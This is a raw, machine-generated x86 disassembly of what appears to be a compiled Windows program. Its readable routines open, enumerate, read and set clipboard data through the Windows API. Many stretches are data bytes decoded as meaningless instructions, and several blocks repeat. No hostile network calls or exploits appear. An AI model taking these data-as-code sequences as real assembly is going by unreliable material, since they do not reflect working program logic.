add [ esi + 0x47 ] ah
add cl dh
inc [ eax ]
add [ esi + 0x47 ] ah
add dl dh
inc [ eax ]
add [ esi + 0x47 ] ah
add bl dh
inc [ eax ]
add [ esi + 0x47 ] ah
add ah dh
inc [ eax ]
add [ esi + 0x47 ] ah
add ch dh
inc [ eax ]
add [ edi ] ch
add [ eax ] al
add ah al
imul eax [ edi ] r-xdata
mov esp 0xc004769
or al 0x43
add [ ecx + ebp * 2 + 0xc040047 ] dh
inc ebx
add [ ecx + ebp * 2 + 0xbfc0047 ] ch
inc ebx
add [ ecx + ebp * 2 + 0xbf40047 ] ah
inc ebx
add [ ecx + ebp * 2 + 0xbec0047 ] bl
inc ebx
add [ ecx + ebp * 2 + 0xbe40047 ] dl
inc ebx
add [ ecx + ebp * 2 + 0xbdc0047 ] cl
inc ebx
add [ ecx + ebp * 2 + 0xbd40047 ] al
inc ebx
add [ ecx + ebp * 2 + 0x47 ] bh
add ah cl
or eax [ ebx ]
je r-xdata
add [ ebx + ecx + 0x43 ] bl
add [ ecx + ebp * 2 ] al
inc edi
add [ ebx + ecx + 0x43 ] dl
add ah bh
push 0xb4c0047
inc ebx
add ah dh
push 0xb440047
inc ebx
add ah ch
push 0xb3c0047
inc ebx
add ah ah
push 0xb340047
inc ebx
add ah bl
push 0xb2c0047
inc ebx
add ah dl
push 0xb240047
inc ebx
add ah cl
push 0xb1c0047
inc ebx
add ah al
push 0xb140047
inc ebx
add [ eax + ebp * 2 + 0xb0c0047 ] bh
inc ebx
add [ eax + ebp * 2 + 0xb040047 ] dh
inc ebx
add [ eax + ebp * 2 + 0xafc0047 ] ch
inc ebx
add [ eax + ebp * 2 + 0xaf40047 ] ah
inc ebx
add [ eax + ebp * 2 + 0xaec0047 ] bl
inc ebx
add [ eax + ebp * 2 + 0xae40047 ] dl
inc ebx
add [ eax + ebp * 2 + 0xadc0047 ] cl
inc ebx
add [ eax + ebp * 2 + 0xad40047 ] al
inc ebx
add [ eax + ebp * 2 + 0x47 ] bh
add ah cl
or al [ ebx ]
je r-xdata
inc edi
add ah al
or eax [ ebx ]
insb
imul eax [ edi ] r-xdata
imul eax [ fs : edi ] r-xdata
pop esp
imul eax [ edi ] r-xdata
push esp
imul eax [ edi ] r-xdata
dec esp
imul eax [ edi ] r-xdata
inc esp
imul eax [ edi ] r-xdata
cmp al 0x69
inc edi
add [ ebx + ecx + 0x69340043 ] cl
inc edi
add [ ebx + ecx + 0x692c0043 ] al
inc edi
add [ ebx + ecx + 0x43 ] bh
add [ ecx + ebp * 2 ] ah
inc edi
add [ ebx + ecx + 0x43 ] dh
add [ ecx + ebp * 2 ] bl
inc edi
add [ ebx + ecx + 0x43 ] ch
add [ ecx + ebp * 2 ] dl
inc edi
add [ ebx + ecx + 0x43 ] ah
add [ ecx + ebp * 2 ] cl
inc edi
clc
pop ebp
retn
inc edi
add ah al
or al [ ebx ]
insb
push 0xabc0047
inc ebx
add [ eax + ebp * 2 + 0x47 ] ah
add [ edx + ecx + 0x685c0043 ] dh
inc edi
add [ edx + ecx + 0x68540043 ] ch
inc edi
add [ edx + ecx - 0x74aaffbd ] ah
in al dx
xor eax eax
push ebp
push sub_430dd4
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
retn
mov eax rw-data
mov ecx 0x2f
mov edx [ r-xdata ]
call sub_40499c
sub_430e10
out 0x47 al
add dh dh
inc [ eax ]
add [ esi + 0x47 ] ah
add bh dh
inc [ eax ]
add [ esi + 0x47 ] ah
add al bh
inc [ eax ]
add [ esi + 0x47 ] ah
add cl bh
inc [ eax ]
add [ esi + 0x47 ] ah
add dl bh
inc [ eax ]
add [ esi + 0x47 ] ah
add bl bh
inc [ eax ]
add [ esi + 0x47 ] ah
add ah bh
inc [ eax ]
add [ esi + 0x47 ] ah
add ch bh
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_430e75
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430e7c
retn
sub_430e8c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
push cs
inc ebx
add [ eax ] dl
add [ eax ] al
add [ eax ] cl
pop esi
inc ecx
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
jb r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
pop esp
adc al 0x43
add [ edx + edx ] ah
inc ebx
add [ eax - 0x75 ] dh
inc ecx
add [ ebx + edx + 0x10080043 ] dl
inc ebx
add [ eax ] ah
cmovae eax [ eax ]
or [ edi ] 0x43
add [ edi + ecx + 0x540a0043 ] ch
inc ebx
insb
imul esi [ eax + 0x62 ] 0x6472616f
pop ecx
pop ebp
retn
nop
add [ edi ] cl
inc ebx
add [ edi ] al
or dl [ ebx + eax * 2 + 0x6c ]
imul esi [ eax + 0x62 ] 0x6472616f
aam 0xe
inc ebx
add [ esi + ebx * 2 + 0x41 ] bh
add [ eax ] al
add [ edi ] al
inc ebx
insb
imul esi [ eax + 0x62 ] 0x6472
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor eax eax
push ebp
push sub_430f58
push [ fs : eax ]
mov [ fs : eax ] esp
call EmptyClipboard
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_430f80
push ebx
mov ebx eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
retn
dec [ ebx + 0x4 ]
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
call CloseClipboard
cmp [ ebx + 0xc ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov eax [ ebx + 0x8 ]
call sub_421954
sub_430fac
push ebx
mov ebx eax
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
inc [ ebx + 0x4 ]
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ ebx + 0x8 ] eax
test eax eax
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
call OpenClipboard
test eax eax
jne r-xdata
push ebx
push sub_431400
call sub_4218a0
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] 0x1
mov [ ebx + 0xd ] 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b920
call sub_40395c
sub_431008
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
push eax
mov eax [ esi + 0x8 ]
push eax
call DefWindowProcA
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_431028
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
push 0x1
call GetClipboardData
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43109a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax ebx
call sub_403f20
mov eax [ ebp - 0x8 ]
push eax
call GlobalLock
mov edx eax
mov eax ebx
call sub_404118
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
mov eax [ ebp - 0x8 ]
push eax
call GlobalUnlock
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4310a1
cmp [ ebp - 0x8 ] 0x0
je r-xdata
sub_4310a8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor edx edx
push ebp
push sub_43114a
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
call EnumClipboardFormats
mov ebx eax
test bx bx
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b920
call sub_40395c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
mov edx ebx
mov eax [ r-xdata ]
call sub_4267a8
test al al
je r-xdata
movzx eax bx
push eax
call EnumClipboardFormats
mov ebx eax
test bx bx
jne r-xdata
movzx eax bx
push eax
call GetClipboardData
mov esi eax
push 0x9
call GetClipboardData
push eax
mov ecx esi
mov edx ebx
mov eax edi
call sub_4266b8
call sub_403a08
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_431158
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor eax eax
push ebp
push sub_4311b0
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x2
call GetClipboardData
mov ebx eax
push 0x9
call GetClipboardData
mov esi eax
push esi
mov ecx ebx
mov dx 0x2
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x5c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4311b7
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_4311c0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor edx edx
push ebp
push sub_431215
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x3
call GetClipboardData
mov ebx eax
push 0x9
call GetClipboardData
push eax
mov ecx ebx
mov dx 0x3
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x5c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43121c
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_431224
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_4310a8
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_431158
jmp r-xdata
mov edx ebx
mov eax esi
call sub_418b68
mov edx ebx
mov eax esi
call sub_4311c0
jmp r-xdata
pop esi
pop ebx
retn
sub_43128c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor eax eax
push ebp
push sub_431301
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_430f64
xor eax eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0xa ]
mov eax ebx
call sub_42677c
mov eax [ ebp - 0x8 ]
push eax
movzx eax [ ebp - 0xa ]
push eax
call SetClipboardData
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431308
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
mov eax [ ebp - 0x10 ]
push eax
push 0x9
call SetClipboardData
sub_431310
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor eax eax
push ebp
push sub_431385
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_430f64
xor eax eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0xa ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax [ ebp - 0x8 ]
push eax
movzx eax [ ebp - 0xa ]
push eax
call SetClipboardData
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43138c
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
mov eax [ ebp - 0x10 ]
push eax
push 0x9
call SetClipboardData
sub_431394
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_43128c
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_418a84
mov edx ebx
mov eax esi
call sub_431310
jmp r-xdata
pop esi
pop ebx
retn
sub_431400
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43142a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43142f
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
je r-xdata
call sub_403984
mov ebx [ rw-data ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x4 ]
call [ ebx ]
jmp r-xdata
call sub_4039d8
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43145c
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
cmp esi [ rw-data ]
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418a58
test bl bl
jle r-xdata
xor eax eax
mov [ rw-data ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_431490
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4314c1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4314c8
retn
mov eax [ rw-data ]
call sub_403190
sub_431629
rol [ eax + eax + 0x18 ] 0x10
inc edx
add [ ecx + eax * 8 + 0xf680044 ] bl
inc edx
add ah bh
cmovb eax [ eax ]
push eax
adc [ edx ] al
fdivr [ edi + 0x2d880044 ]
inc ebx
add [ eax - 0x40 ] dl
inc esp
add ah dl
sub eax 0x98f00043
inc ebp
add al cl
rol [ eax + eax - 0x7c ] 0xc0
inc esp
add [ ecx + ebx * 4 ] ch
inc ebp
add [ eax - 0x67 ] al
inc ebp
add [ eax + eax * 8 - 0x6697ffbc ] bh
inc ebp
add [ eax ] bl
rol [ eax + eax + 0x4 ] 0x2e
inc ebx
add [ eax ] bh
rol [ eax + eax + 0x24 ] 0x2e
inc ebx
add [ edx + eax * 8 + 0x44 ] cl
add [ edx + eax * 8 ] ch
inc esp
add [ edx + eax * 8 + 0x44 ] ch
add [ eax - 0x3f ] bl
inc esp
add [ ecx + ebx * 4 - 0x666fffbb ] cl
inc ebp
add [ ecx + eax * 8 + 0x44 ] bh
add ah ch
mov esi 0x54160044
push ebx
jo r-xdata
inc esp
inc edx
jne r-xdata
inc esp
je r-xdata
add al cl
hlt
add [ ecx ] cl
inc esp
add ah bl
loope r-xdata
add ah bl
push cs
inc edx
add ah al
or eax [ edx ]
mov esp 0xe400420b
push cs
inc edx
add [ esi + ebp + 0x43 ] al
add [ eax ] dl
loope r-xdata
add [ edi + ecx * 8 + 0x44 ] dh
add [ edx + ecx * 4 + 0x33d80041 ] al
inc ebx
add [ esi + eax * 8 + 0x44 ] bl
add al cl
lds eax [ eax + eax + 0x74 ]
iretd
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x43170090
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebx ] al
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0xdffbce9 ] dl
pop ss
inc ebx
add [ ecx + eax - 0x6d0c0000 ] al
inc esp
add ah al
push cs
inc edx
add ah ah
xor eax [ eax ]
sbb [ eax ] cl
inc edx
add ah ch
xor eax [ eax ]
mov al [ 0x280044e5 ]
xor [ eax ] eax
inc esp
xor [ eax ] eax
add al 0x2f
inc ebx
add [ eax + 0x780044f2 ] al
out 0x44 al
add ah dl
salc
inc esp
add [ eax - 0x39 ] cl
inc esp
add [ esi + edx * 8 + 0x2f3c0044 ] dh
inc ebx
add [ eax ] dl
add [ ebx ] al
add cl [ eax + esi * 4 ]
sbb [ eax - 0x4ff14ffa ] dh
adc dh [ eax - 0x4fec4fdc ]
adc al 0xb0
out dx eax
add al dl
les eax [ eax + eax + 0x14 ]
int3
sub_431756
inc esp
add [ esp + esi * 8 + 0x44 ] al
add [ edi + ecx * 8 + 0x44 ] bl
add [ ebp + eax * 8 - 0x2f17ffbc ] dl
inc esp
add [ eax - 0x30 ] ah
inc esp
add [ ebx + edx * 8 + 0x44 ] dh
add [ eax ] ah
rol [ eax + eax + 0xc ] cl
in al 0x44
add al cl
hlt
sub_431b37
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and [ eax ] eax
pop es
push esi
imul esi [ ebx + 0x69 ] 0x74656c62
push edi
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
sub_431b58
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070022 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
sub [ ecx ] al
add bh bh
sub [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax [ eax ]
or cl [ edi + 0x6e ]
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
rol [ eax ] 0x1
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and al 0x0
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
inc ebx
add [ eax - 0x48000000 ] cl
xchg edi eax
inc esp
add ah al
push cs
inc edx
add ah ah
xor eax [ eax ]
sbb [ eax ] cl
inc edx
add ah ch
xor eax [ eax ]
loopne r-xdata
inc esp
outsd
ja r-xdata
or eax [ edx ]
in al 0xe
inc edx
add al bh
mov [ 0xffffffffacf80045 ] al
inc ebp
add [ esp + edx * 2 ] bh
inc ebp
add [ eax ] al
mov edx 0xba8c0045
inc ebp
add [ eax + 0xa004555 ] al
push esp
inc edi
insb
jns r-xdata
inc eax
sub [ ecx + 0xd80044 ] al
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0b00
dec ebp
outsd
jne r-xdata
inc eax
add al ch
push ds
inc ebx
add [ ebx ] cl
push 0x7473694c
nop
movsb [ edi ] [ esi ]
sbb al 0x43
add [ edi ] al
or dl [ edi + eax * 2 + 0x6c ]
jns r-xdata
int3
dec ebp
outsd
jbe r-xdata
pop ss
std
dec [ ebx - 0x740f7426 ]
inc ebp
or [ eax + 0x33 ] dl
ror [ ebx - 0x7a55173a ] cl
add al [ eax ]
push 0x68636143
push 0x431d
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x7473694c
push eax
sbb al 0x43
add [ eax + ebx * 4 + 0x44 ] dl
add [ eax + eax ] cl
pop es
inc edx
jne r-xdata
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
mov al 0x80
inc esp
add al ah
add [ eax ] al
jmp eax
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ esi + 0x80 ] eax
mov eax esi
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
xor edx edx
mov eax esi
call sub_45a344
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
cmp al 0x20
inc ebx
add [ esp + edx * 2 ] cl
inc edx
jne r-xdata
add [ eax ] al
add [ eax - 0x27ffbff0 ] dh
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x3000431d
je r-xdata
dec [ ebx - 0x31d7f2d ]
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
jae r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403544
scasb [ edi ]
adc edi ebp
outsb
inc edi
insb
jns r-xdata
add [ eax ] dl
sbb eax 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ 0x80043 ] bl
add [ eax ] al
mov al 0x10
inc eax
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
mov eax esi
call sub_45a398
test bl bl
jle r-xdata
and dl 0xfc
push 0x5500408d
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1d ] ch
inc ebx
add [ eax ] dh
push esp
inc edi
insb
jns r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
call 0xb43602f
mov ebx edx
mov esi eax
add esp 0xfffffff0
call sub_4034f4
sub_431c08
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
sbb al 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebx + 0x880043 ] dl
add [ eax ] al
mov eax 0xc4004497
push cs
inc edx
add ah ah
xor eax [ eax ]
sbb [ eax ] cl
inc edx
add ah ch
xor eax [ eax ]
loopne r-xdata
or eax [ edx ]
in al 0xe
inc edx
add al bh
mov [ 0xffffffffacf80045 ] al
inc ebp
add [ esp + edx * 2 ] bh
inc ebp
add [ eax ] al
mov edx 0xba8c0045
inc ebp
add [ eax + 0xa004555 ] al
push esp
inc edi
insb
jns r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
int3
inc eax
add al ch
push ds
inc ebx
add [ ebx ] cl
push 0x7473694c
nop
movsb [ edi ] [ esi ]
sbb al 0x43
add [ edi ] al
or dl [ edi + eax * 2 + 0x6c ]
jns r-xdata
pop ss
std
dec [ ebx - 0x740f7426 ]
inc ebp
or [ eax + 0x33 ] dl
ror [ ebx - 0x7a55173a ] cl
add al [ eax ]
push 0x68636143
push 0x431d
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x7473694c
push eax
sbb al 0x43
add [ eax + ebx * 4 + 0x44 ] dl
add [ eax + eax ] cl
pop es
inc edx
jne r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ esi + 0x80 ] eax
mov eax esi
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
xor edx edx
mov eax esi
call sub_45a344
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
cmp al 0x20
inc ebx
add [ esp + edx * 2 ] cl
inc edx
jne r-xdata
add [ eax ] al
add [ eax - 0x27ffbff0 ] dh
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x3000431d
je r-xdata
dec [ ebx - 0x31d7f2d ]
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
jae r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403544
scasb [ edi ]
adc edi ebp
outsb
inc edi
insb
jns r-xdata
add [ eax ] dl
sbb eax 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ 0x80043 ] bl
add [ eax ] al
mov al 0x10
inc eax
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
mov eax esi
call sub_45a398
test bl bl
jle r-xdata
and dl 0xfc
push 0x5500408d
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1d ] ch
inc ebx
add [ eax ] dh
push esp
inc edi
insb
jns r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
call 0xb43602f
mov ebx edx
mov esi eax
add esp 0xfffffff0
call sub_4034f4
sub_431d78
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
xor edx edx
mov eax esi
call sub_45a344
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ esi + 0x80 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_431dcc
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
mov eax [ esi + 0x80 ]
call sub_403190
mov edx ebx
and dl 0xfc
mov eax esi
call sub_45a398
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_431dfc
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x80 ]
call sub_4189e0
mov esi eax
mov eax [ ebx + 0x80 ]
cmp esi [ eax + 0x4 ]
jl r-xdata
mov cl 0x1
mov edx esi
mov eax [ ebx + 0x80 ]
call sub_41899c
mov eax esi
pop esi
pop ebx
retn
xor ecx ecx
xor edx edx
mov eax ebx
call sub_45a7cc
mov esi eax
lea edx [ esi + 0x1 ]
mov eax [ ebx + 0x80 ]
call sub_4188f8
sub_431e48
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_431dfc
mov esi eax
push ebp
mov ecx edi
mov edx esi
mov eax ebx
call sub_45a9d8
inc [ ebx + 0x84 ]
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_431e74
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x80 ]
call sub_4189c8
test al al
je r-xdata
pop esi
pop ebx
retn
dec [ ebx + 0x84 ]
xor ecx ecx
mov edx esi
mov eax [ ebx + 0x80 ]
call sub_41899c
sub_431ea4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403160
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax esi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_431ee8
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403190
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403180
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_431f18
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax [ esp ]
push eax
mov ecx ebp
mov dl 0x1
mov eax [ r-xdata ]
call sub_431d78
mov ebx eax
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_418314
mov eax [ edi + 0x4 ]
mov edx esi
call sub_418470
mov ebx eax
cmp ebp [ ebx + 0x34 ]
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebx + 0x30 ]
cmp eax [ esp ]
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_431f78
push ebx
mov ebx edx
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ ebx + 0x84 ] 0x0
